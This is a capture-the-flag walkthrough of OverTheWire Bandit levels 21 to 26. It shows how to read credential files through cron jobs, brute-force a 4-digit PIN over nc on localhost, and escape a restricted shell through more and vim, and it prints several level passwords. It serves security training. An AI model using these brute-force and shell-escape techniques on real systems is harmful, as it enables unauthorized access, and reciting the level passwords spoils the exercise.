
# Bandit Overthewire

## 21 -> 22:
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

```bash
$ cd /etc/cron.d
$ cat cronjob_bandit22

#* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

$ cat /usr/bin/cronjob_bandit22.sh

# #!/bin/bash
#chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
#cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

## 22 -> 23:
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```bash
$ cat /etc/cron.d/cronjob_bandit23

# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

$ cat /usr/bin/cronjob_bandit23.sh

# #!/bin/bash
# myname=$(whoami)
# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
# echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
# cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

The password to bandit24 can be found at /etc/bandit_pass/bandit24 which is redirected to /tmp/8ca319486bfbbc3663ea0fbe81326349.

Password is `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`

## 23 -> 24:
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```


## 24 -> 25:
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```bash
for i in {0000..9999}
do
	echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done
```

run this script and store the output to `combinations.txt`

```bash
$ ./script.sh | nc localhost 30002 
```

## 25 -> 26:
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

```bash
$ cat /etc/passwd | grep bandit26
$ cat /usr/bin/showtext
```

In showtext, we can see as below
```bash
#!/bin/sh
export TERM=linux

more ~/text.txt  
exit 0
```

more opens the text file, resize the window so that more works.

by pressing `v`, it opens vim editor.

Vim has the ability to edit files without exiting it

`-e /etc/bandit_pass/bandit26`

The password is `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`

We can set shell to bash using `set shell=/bin/bash`

## 26 -> 27:
